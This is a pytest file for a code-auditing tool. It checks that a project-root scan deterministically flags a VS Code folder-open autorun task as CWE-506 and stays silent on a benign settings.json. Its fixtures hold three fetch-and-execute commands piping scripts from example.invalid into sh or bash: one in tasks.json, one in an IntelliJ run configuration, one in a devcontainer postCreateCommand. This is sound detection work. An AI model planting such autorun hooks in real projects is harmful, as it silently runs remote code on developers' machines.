"""Feature 0091 P2 (D2) — editor/workspace autorun files are SCANNED, and the
task that runs a shell command on folder-open is found DETERMINISTICALLY.

THE DEFECT THIS PINS. `.vscode`, `.idea`, `.eclipse` and `.claude` are in the
walker's hardcoded ``SKIP_DIRS``. A scan of a project ROOT therefore never
descends into them, and the single most dangerous thing a repository can carry
— a VS Code task with ``"runOn": "folderOpen"`` that executes a shell command
the moment the folder is opened — is invisible to every skill. Both archived
root scans of the reference target returned ZERO findings under `.vscode`. The
one time that task WAS reported it came from the LLM tier, having been reached
only because someone scanned `.vscode` directly as its own root; and because it
came from the LLM tier, the very next scan's prior-findings block suppressed
it, its absence was read as repair, and the lineage row was marked `fixed`
while the offending line sat in the file byte for byte (feature 0091 §1).

THE CONTRACT. Two halves, and the second is what keeps the first honest:

1.  A scan of the ROOT — not of `.vscode` — reports the autorun task, from the
    DETERMINISTIC tier. Deterministic is the load-bearing word. A skill's
    finding is reproducible on every scan, is never placed in the memory
    suppression block that told the model to stay quiet, and closes only when
    the pattern actually leaves the file. Moving this class from "the model
    mentioned it once" to "a skill finds it every time" is the whole point of
    D2; a root scan that surfaced it via the LLM tier would satisfy the letter
    of the test and none of its purpose.

2.  A benign `.vscode/settings.json` — nothing in it but editor preferences —
    yields ZERO findings. Un-pruning a directory that every project on earth
    carries is only safe if what comes back is the autorun class and nothing
    else. Without this half, "scan `.vscode`" degrades into a noise generator
    and the honest response would be to prune it again.

The fixture is a REALISTIC tree, not a single file: the autorun task sits
alongside `.idea/runConfigurations`, `.devcontainer` and ordinary source, so
the assertions are made about a root scan of a project rather than about a
directory that happens to contain one interesting file.

Run with the LLM phase off (the shipped default), so tier 2 cannot contribute a
finding at all and half 1 can only be satisfied by a skill.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from cwe_agent.agent import run_audit

# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #


def _parse_event(events: list[str], event_name: str) -> dict:
    for event in events:
        if f"event: {event_name}" in event:
            data_line = next(ln for ln in event.split("\n") if ln.startswith("data:"))
            return json.loads(data_line[5:])
    raise AssertionError(f"no '{event_name}' event found in SSE output")


def _rel(finding: dict, root: Path) -> str:
    """A finding's file path, root-relative and slash-normalised."""
    raw = str(finding.get("file_path", ""))
    try:
        return Path(raw).resolve().relative_to(root.resolve()).as_posix()
    except ValueError:
        return raw


def _line_of(text: str, needle: str) -> int:
    """1-based line number of the first line containing ``needle``."""
    for i, line in enumerate(text.splitlines(), start=1):
        if needle in line:
            return i
    raise AssertionError(f"fixture does not contain {needle!r}")


def _is_deterministic(finding: dict) -> bool:
    """Mirror of Go's ``model.TierOf``: the LLM tier iff provenance starts with
    ``llm``; everything else — ``skill``, ``catalog_rollup``, a plugin, and the
    empty string — is deterministic."""
    return not str(finding.get("provenance", "")).strip().lower().startswith("llm")


def _describe(findings: list[dict], root: Path) -> str:
    if not findings:
        return "(no findings at all)"
    return "\n".join(
        f"  {f.get('check_id', '?')} {f.get('category', '?')} "
        f"{_rel(f, root)}:{f.get('line_start')} provenance={f.get('provenance', '')!r}"
        for f in findings
    )


# --------------------------------------------------------------------------- #
# Fixture — a realistic project root carrying editor/workspace configuration
# --------------------------------------------------------------------------- #

# The malicious task. `"runOn": "folderOpen"` is the trigger: VS Code executes
# `command` when the folder is opened, before the user runs anything. The
# `"command"` line is the line a finding must cite — it is line 7 here, which is
# the exact site of the reference incident (`.vscode/tasks.json:7`), but the
# test resolves it from the text rather than trusting this comment.
VSCODE_TASKS_JSON = """\
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "command": "curl -s https://example.invalid/payload.sh | sh",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
"""

# Editor preferences and nothing else. This file is the false-positive control:
# it is the most common thing inside `.vscode`, it is present in a large share
# of real repositories, and it must stay silent.
VSCODE_SETTINGS_JSON = """\
{
  "editor.tabSize": 2,
  "editor.formatOnSave": true,
  "files.autoSave": "afterDelay",
  "files.exclude": { "**/.git": true }
}
"""

IDEA_RUN_CONFIG_XML = """\
<component name="ProjectRunConfigurationManager">
  <configuration name="setup" type="ShConfigurationType">
    <command>/bin/sh -c "wget -qO- https://example.invalid/install.sh | sh"</command>
  </configuration>
</component>
"""

DEVCONTAINER_JSON = """\
{
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
  "postCreateCommand": "bash -c \\"curl -s https://example.invalid/post.sh | bash\\""
}
"""

APP_JS = """\
export function add(a, b) {
  return a + b;
}
"""


@pytest.fixture
def autorun_source(tmp_path: Path) -> Path:
    """A project root whose editor/workspace directories carry autorun hooks."""
    (tmp_path / ".vscode").mkdir()
    (tmp_path / ".vscode" / "tasks.json").write_text(VSCODE_TASKS_JSON)
    (tmp_path / ".vscode" / "settings.json").write_text(VSCODE_SETTINGS_JSON)

    (tmp_path / ".idea" / "runConfigurations").mkdir(parents=True)
    (tmp_path / ".idea" / "runConfigurations" / "x.xml").write_text(IDEA_RUN_CONFIG_XML)

    (tmp_path / ".devcontainer").mkdir()
    (tmp_path / ".devcontainer" / "devcontainer.json").write_text(DEVCONTAINER_JSON)

    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.js").write_text(APP_JS)
    return tmp_path


@pytest.fixture(autouse=True)
def _llm_phase_off(monkeypatch: pytest.MonkeyPatch) -> None:
    """Skills-only, the shipped default. With tier 2 unable to run, any finding
    in the result is deterministic by construction — which is what makes the
    "from the deterministic tier" half of the contract checkable rather than
    merely asserted."""
    monkeypatch.delenv("VULTURE_USE_LLM", raising=False)
    monkeypatch.delenv("VULTURE_LLM_TIER3", raising=False)


# --------------------------------------------------------------------------- #
# D2 — the acceptance test
# --------------------------------------------------------------------------- #


def test_root_scan_finds_autorun_task(autorun_source: Path) -> None:
    """A scan of the project ROOT finds the folder-open shell task in
    `.vscode/tasks.json` as a deterministic CWE-506, and finds nothing at all in
    a `.vscode/settings.json` that holds only editor preferences.

    The scan target is the root. Nothing here scans `.vscode` directly — that
    path already works today and is exactly the workaround whose findings the
    lineage defect then threw away.
    """
    events = list(run_audit("0091-autorun", str(autorun_source), {}))
    result = _parse_event(events, "result")
    findings: list[dict] = result["findings"]

    # ── Half 1: the autorun task is reported, deterministically ────────────
    tasks_line = _line_of(VSCODE_TASKS_JSON, '"command"')
    autorun = [
        f
        for f in findings
        if _rel(f, autorun_source) == ".vscode/tasks.json"
        and f.get("category") == "CWE-506"
    ]
    assert autorun, (
        "a scan of the ROOT must report the `runOn: folderOpen` shell task in "
        f".vscode/tasks.json as CWE-506. `.vscode` is in the walker's SKIP_DIRS, "
        f"so a root scan sees nothing there; pruned_dirs for this scan was "
        f"{result.get('pruned_dirs')!r}. All findings:\n"
        + _describe(findings, autorun_source)
    )

    at_command_line = [f for f in autorun if f.get("line_start") == tasks_line]
    assert at_command_line, (
        f"the CWE-506 must cite the command line (.vscode/tasks.json:{tasks_line}) — "
        "the line that actually executes — not the file. Got: "
        + _describe(autorun, autorun_source)
    )

    deterministic = [f for f in at_command_line if _is_deterministic(f)]
    assert deterministic, (
        "the autorun finding must come from the DETERMINISTIC tier. A finding "
        "that exists only because a model mentioned it is suppressed by the "
        "prior-findings block on the next scan and its absence is then read as "
        "repair — the exact failure feature 0091 exists to end. Got: "
        + _describe(at_command_line, autorun_source)
    )

    assert any(
        str(f.get("check_id", "")).startswith("cwe.workspace_autorun.")
        for f in deterministic
    ), (
        "the autorun finding must carry a `cwe.workspace_autorun.*` check_id so "
        "the class is identifiable in lineage and in the aggregate report. Got: "
        + _describe(deterministic, autorun_source)
    )

    # ── Half 2: benign editor preferences stay silent ──────────────────────
    settings_findings = [
        f for f in findings if _rel(f, autorun_source) == ".vscode/settings.json"
    ]
    assert settings_findings == [], (
        "a `.vscode/settings.json` holding only editor preferences must produce "
        "ZERO findings. Un-pruning `.vscode` is only defensible if what comes "
        "back is the autorun class and nothing else. Got:\n"
        + _describe(settings_findings, autorun_source)
    )
